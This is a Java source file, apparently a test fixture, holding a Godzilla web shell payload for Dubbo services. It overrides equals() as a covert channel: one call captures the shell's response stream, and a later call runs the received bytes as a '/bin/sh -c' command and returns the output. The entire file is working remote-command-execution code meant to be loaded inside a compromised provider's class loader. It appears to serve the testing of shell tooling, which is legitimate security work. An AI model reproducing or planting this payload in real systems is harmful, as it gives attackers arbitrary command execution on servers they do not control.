package io.github.reajason.dubbo.fixture.client.godzilla;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

/**
 * Godzilla payload that executes the decrypted request as a shell command and streams the
 * combined output back through the shell's response channel. It only depends on the JDK
 * because the shell defines it inside the provider's class loader.
 */
public class GodzillaCommandPayload {

    private ByteArrayOutputStream response;

    public boolean equals(Object candidate) {
        if (candidate instanceof ByteArrayOutputStream) {
            response = (ByteArrayOutputStream) candidate;
            return true;
        }
        if (candidate instanceof byte[]) {
            if (response == null) {
                return false;
            }
            try {
                response.write(execute(new String((byte[]) candidate, StandardCharsets.UTF_8)));
                return true;
            } catch (IOException e) {
                return false;
            }
        }
        return false;
    }

    public int hashCode() {
        return 0;
    }

    public String toString() {
        return "";
    }

    private byte[] execute(String command) throws IOException {
        Process process = new ProcessBuilder("/bin/sh", "-c", command)
                .redirectErrorStream(true)
                .start();
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        try (InputStream input = process.getInputStream()) {
            byte[] buffer = new byte[4096];
            int read;
            while ((read = input.read(buffer)) > 0) {
                output.write(buffer, 0, read);
            }
        }
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        return output.toByteArray();
    }
}
